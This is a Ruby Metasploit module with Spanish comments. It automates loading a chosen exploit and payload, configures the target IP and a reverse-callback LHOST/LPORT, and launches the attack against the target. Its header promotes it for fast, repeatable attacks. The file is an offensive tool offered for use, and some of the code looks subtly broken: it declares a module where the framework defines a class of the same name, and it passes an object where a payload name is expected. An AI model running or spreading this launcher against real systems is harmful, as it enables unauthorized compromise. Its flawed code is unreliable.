#!/usr/bin/env ruby

=begin
Este módulo auxiliar de Metasploit permite automatizar el proceso de ejecutar un exploit
y un payload contra un sistema objetivo. Los usuarios deben especificar el exploit, el payload,
la IP del objetivo (RHOST), y la configuración de red del payload (IP local y puerto local).
El script carga y configura tanto el exploit como el payload, luego ejecuta el exploit de manera
automática para intentar comprometer el sistema objetivo.

Este tipo de automatización es útil para realizar ataques repetibles y rápidos, y también es una forma
de simplificar el proceso de explotación en un entorno de pruebas o simulaciones de penetración.
=end

require 'msf/core'

module Msf
	module Auxiliary
		# La clase AutomatedExploitLauncher hereda de Msf::Auxiliary. 
		# Un módulo auxiliar en Metasploit se utiliza para realizar tareas específicas 
		# que no están directamente relacionadas con la explotación, como escaneos, 
		# pruebas de servicios o automatización de ataques.
		class AutomatedExploitLauncher < Msf::Auxiliary
			# Este método inicializa el módulo con algunos metadatos como el nombre del módulo,
			# la descripción y el autor.
			def initialize
				super(
					'Name' => 'Automated Exploit Launcher',
					'Description' => 'Lanza automáticamente un exploit y payload especificados contra un sistema objetivo.',
					'Author' => ['Tu Nombre'],
					'License' => MSF_LICENSE
				)

				# Opciones del módulo
				register_options(
					[
						Opt::RHOST(),
						OptString.new('EXPLOIT', [true, 'Nombre del módulo exploit a usar']),
						OptString.new('PAYLOAD', [true, 'Nombre del payload a usar']),
						OptString.new('LHOST', [true, 'IP local para el payload']),
						OptInt.new('LPORT', [true, 'Puerto local para el payload', 4444])
					]
				)
			end

			# El método run es el que se ejecuta cuando se corre el módulo.
			# Aquí se obtiene la configuración de las opciones definidas anteriormente
			# desde el datastore de Metasploit (las opciones proporcionadas por el usuario).
			def run
				# Obtener parámetros del datastore
				target_ip = datastore['RHOST']
				exploit_name = datastore['EXPLOIT']
				payload_name = datastore['PAYLOAD']
				lhost = datastore['LHOST']
				lport = datastore['LPORT']

				# Cargar y configurar el exploit:
				print_status("Lanzando exploit #{exploit_name} contra #{target_ip} con payload #{payload_name}")

				begin
					# Cargar el módulo exploit
					exploit = framework.exploits.create(exploit_name)
					if exploit.nil?
						print_error("No se pudo cargar el módulo exploit: #{exploit_name}")
						return
					end

					# Configurar el exploit
					exploit.datastore['RHOST'] = target_ip

					# Cargar y configurar el payload:
					payload = framework.payloads.create(payload_name)
					if payload.nil?
						print_error("No se pudo cargar el payload: #{payload_name}")
						return
					end

					# Configurar el payload
					payload.datastore['LHOST'] = lhost
					payload.datastore['LPORT'] = lport

					# Configurar y ejecutar el exploit
					exploit.datastore['PAYLOAD'] = payload.name
					print_status("Ejecutando exploit...")
					exploit.exploit_simple(
						'Payload' => payload,
						'LocalInput' => framework.input,
						'LocalOutput' => framework.output
					)
				rescue => e
					print_error("Error al ejecutar el exploit: #{e.message}")
				end
			end
		end
	end
end
